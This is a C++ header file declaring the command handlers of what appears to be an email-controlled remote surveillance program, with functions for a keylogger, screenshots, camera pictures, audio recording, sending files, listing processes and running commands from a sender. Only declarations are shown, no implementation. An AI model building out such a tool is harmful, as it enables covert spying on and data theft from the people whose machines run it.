#pragma once
#include "lib.h"
#include "listProgram.h"
#include "config.h"
#include "sendEmail.h"
#include "shutdownProgram.h"
#include "sendPicture.h"
#include "sendScreenshot.h"
#include "keylogger.h"
#include "recording.h"

std::string trim_command(std::string command);

void execute_command(const std::string& command);

void handle_start_program(const std::string& command);

void handle_shutdown_program(const std::string& command);

void handle_get_picture();

void handle_get_screenshot();

void handle_list_programs();

void handle_list_processes();

void handle_send_file(const std::string& command);

void handle_start_recording();

void handle_stop_recording();

void handle_shutdown();

void handle_keylogger(const std::string& command);

void execute_command_with_sender(const string& sender, const string& command);